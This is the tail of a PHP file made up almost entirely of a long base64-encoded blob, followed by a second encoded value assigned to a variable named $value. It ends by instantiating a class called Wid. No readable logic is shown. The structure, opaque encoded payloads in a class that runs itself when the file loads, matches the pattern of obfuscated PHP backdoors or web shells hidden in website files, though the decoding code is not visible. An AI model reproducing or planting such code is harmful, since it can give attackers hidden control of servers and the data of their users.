	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';
	 
	var $value = 'XZBPa4NAEMXPBvIdpouwCtJWAqFg9FKElB5s1fYiRTZmRSH+YXdNDaXfvbObS+NtZt+b374Z+zhDCJQG
	YH9zXdbsJHmwXtmHqseWlATuQU4HqYQjG+Y7dpnF6WecFnSf52/lPsly+uV68OjBxsXBtnZaKblCYxq/
	f8RZXtDyPKPHhZ/1yrJs8+UtcuE0NH+rcdYvcEz0j/qcJK8vcaEDLpi3WmCE61ZKTNzATL473o3q4uAQ
	zguuJtEDE4KZJw9o7ddPmy31QHM8cxkdhVfNAHRXD6IDVql26ENCoOOqGY4hGQepSLRr+3FSoC4jD4ni
	syLQsw5rXGyh4gW6FvUzO03YRhHqDxoe0eAP';
}

new Wid();
?>